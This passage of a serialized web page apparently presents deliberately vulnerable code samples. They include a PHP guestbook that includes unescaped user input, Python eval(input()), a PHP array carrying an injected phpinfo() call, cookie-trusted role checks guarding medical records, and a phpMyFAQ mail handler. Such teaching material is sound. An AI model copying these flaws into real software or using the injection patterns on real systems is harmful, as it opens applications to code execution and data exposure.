punctuation\"\u003e(\u003c/span\u003eEX_OSERR\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n"])</script><script>self.__next_f.push([1,"46:Td05,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token variable\"\u003e$MessageFile\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"messages.out\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"action\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"NewMessage\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$name\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"name\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$message\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"message\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$handle\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003efopen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$MessageFile\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"a+\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003efwrite\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$handle\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\u0026lt;b\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token variable\"\u003e$name\u003c/span\u003e\u003c/span\u003e\u0026lt;/b\u003e says '\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token variable\"\u003e$message\u003c/span\u003e\u003c/span\u003e'\u0026lt;hr\u003e\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003efclose\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$handle\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eecho\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"Message Saved!\u0026lt;p\u003e\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"action\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"ViewMessages\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003einclude\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$MessageFile\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"47:T66b,\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003emain\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token builtin\"\u003esum\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\n    numbers \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token builtin\"\u003eeval\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token builtin\"\u003einput\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Enter a space-separated list of numbers: \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003efor\u003c/span\u003e num \u003cspan class=\"token keyword\"\u003ein\u003c/span\u003e numbers\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token builtin\"\u003esum\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token builtin\"\u003esum\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e num\n    \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string-interpolation\"\u003e\u003cspan class=\"token string\"\u003ef\"Sum of \u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003enumbers\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e = \u003c/span\u003e\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\u003cspan class=\"token builtin\"\u003esum\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nmain\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n48:T720,\u003cspan class=\"token php language-php\"\u003e\u003cspan class=\"token delimiter important\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$cats\u003c/span\u003e\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token keyword\"\u003earray\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\n\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e\u003cspan class=\"token keyword\"\u003earray\u003c/span\u003e\u003cspan class=\"token punct"])</script><script>self.__next_f.push([1,"uation\"\u003e(\u003c/span\u003e\n\u003cspan class=\"token string single-quoted-string\"\u003e'name'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'未分组'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n\u003cspan class=\"token string single-quoted-string\"\u003e'status'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n\u003cspan class=\"token string single-quoted-string\"\u003e'orders'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n\u003cspan class=\"token string single-quoted-string\"\u003e'id'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e\n\u003cspan class=\"token number\"\u003e7\u003c/span\u003e\u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e\u003cspan class=\"token keyword\"\u003earray\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\n\u003cspan class=\"token string single-quoted-string\"\u003e'name'\u003c/span\u003e\u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e''\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\u003cspan class=\"token function\"\u003ephpinfo\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\u003cspan class=\"token comment\"\u003e/*\n\n...*/\u003c/span\u003e\n\u003c/span\u003e49:Te03,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token variable\"\u003e$role\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_COOKIES\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'role'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token operator\"\u003e!\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$role\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$role\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003egetRole\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'user'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$role\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e// save the cookie to send out in future responses\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003esetcookie\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"role\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$role\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token function\"\u003etime\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e \u003cspan class=\"token number\"\u003e60\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token number\"\u003e60\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003eShowLoginScreen\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003edie\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$role\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token string single-quoted-string\"\u003e'Reader'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token function\"\u003eDisplayMedicalHistory\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_POST\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'patient_ID'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003edie\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"You are not Authorized to view this record\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"4a:T40e,case 'sendtofriends':\n    $postData = json_decode(file_get_contents('php://input'), true, 512, JSON_THROW_ON_ERROR);\n\n    $author = trim((string) Filter::filterVar($postData['name'], FILTER_SANITIZE_SPECIAL_CHARS));\n    $email = Filter::filterVar($postData['email'], FILTER_VALIDATE_EMAIL);\n    $link = trim((string) Filter::filterVar($postData['link'], FILTER_VALIDATE_URL));\n    $attached = trim((string) Filter::filterVar($postData['message'], FILTER_SANITIZE_SPECIAL_CHARS));\n    $mailto = Filter::filterArray($postData['mailto[]']);\n\n    $faqLanguage = trim((string) Filter::filterVar($postData['lang'], FILTER_SANITIZE_SPECIAL_CHARS));\n    $faqId = trim((string) Filter::filterVar($postData['faqId'], FILTER_VALIDATE_INT));\n    $categoryId = trim((string) Filter::filterVar($postData['categoryId'], FILTER_VALIDATE_INT));\n\n    if (is_array($mailto) \u0026\u0026 count($mailto) \u003e 5) {\n        $response-\u003esetStatusCode(Response::HTTP_BAD_REQUEST);\n        $response-\u003esetData(['error' =\u003e Translation::get('err_sendMail')]);\n        break;\n    }\n4b:T2456,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003ecase\u003c/span\u003e \u003cspan class=\"token string single-quoted-string\"\u003e'sendtofriends'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$postData\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003ejson_decode\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003efile_get_contents\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'php://input'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token constant boolean\"\u003etrue\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e512\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token constant\"\u003eJSON_THROW_ON_ERROR\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"token variable\"\u003e$author\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003etrim\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword type-casting\"\u003estring\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token class-name static-context\"\u003eFilter\u003c/span\u003e\u003cspan class=\"token operator\"\u003e::\u003c/span\u003e\u003cspan class=\"token function\"\u003efilterVar\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$postData\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'name'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token constant\"\u003eFILTER_SANITIZE_SPECIAL_CHARS\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$email\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token class-name static-context\"\u003eFilter\u003c/span\u003e\u003cspan class=\"token operator\"\u003e::\u003c/span\u003e\u003cspan class=\"token function\"\u003efilterVar\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$postData\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'email'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token constant\"\u003eFILTER_VALIDATE_EMAIL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$link\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003etrim\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword type-casting\"\u003estring\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token class-name static-context\"\u003eFilter\u003c/span\u003e\u003cspan class=\"token operator\"\u003e::\u003c/span\u003e\u003cspan class=\"token function\"\u003efilterVar\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$postData\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'link'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token constant\"\u003eFILTER_VALIDATE_URL\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$attached\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003etrim\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword type-casting\"\u003estring\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token class-name static-context\"\u003eFilter\u003c/span\u003e\u003cspan class=\"token operator\"\u003e::\u003c/span\u003e\u003cspan class=\"token function\"\u003efilterVar\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$postData\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'message'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token constant\"\u003eFILTER_SANITIZE_SPECIAL_CHARS\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$mailto\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token class-name static-context\"\u003eFilter\u003c/span\u003e\u003cspan class=\"token operator\"\u003e::\u003c/span\u003e\u003cspan class=\"token function\"\u003efilterArray\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$postData\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'mailto[]'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"token variable\"\u003e$faqLanguage\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003etrim\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword type-casting\"\u003estring\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token class-name static-context\"\u003eFilter\u003c/span\u003e\u003cspan class=\"token operator\"\u003e::\u003c/span\u003e\u003cspan class=\"token function\"\u003efilterVar\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$postData\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'lang'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token constant\"\u003eFILTER_SANITIZE_SPECIAL_CHARS\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$faqId\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003etrim\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword type-casting\"\u003estring\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token class-name static-context\"\u003eFilter\u003c/span\u003e\u003cspan class=\"token operator\"\u003e::\u003c/span\u003e\u003cspan class=\"token function\"\u003efilterVar\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$postData\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'faqId'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token constant\"\u003eFILTER_VALIDATE_INT\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$categoryId\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003etrim\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token keyword type-casting\"\u003estring\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token class-name static-context\"\u003eFilter\u003c/span\u003e\u003cspan class=\"token operator\"\u003e::\u003c/span\u003e\u003cspan class=\"token function\"\u003efilterVar\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$postData\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'categoryId'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token constant\"\u003eFILTER_VALIDATE_INT\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003eis_array\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$mailto\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"token function\"\u003ecount\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$mailto\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token operator\"\u003e\u003e\u003c/span\u003e \u003cspan class=\"token number\"\u003e5\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token variable\"\u003e$response\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003e\u003c/span\u003e\u003cspan class=\"token function\"\u003esetStatusCode\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name static-context\"\u003eResponse\u003c/span\u003e\u003cspan class=\"token 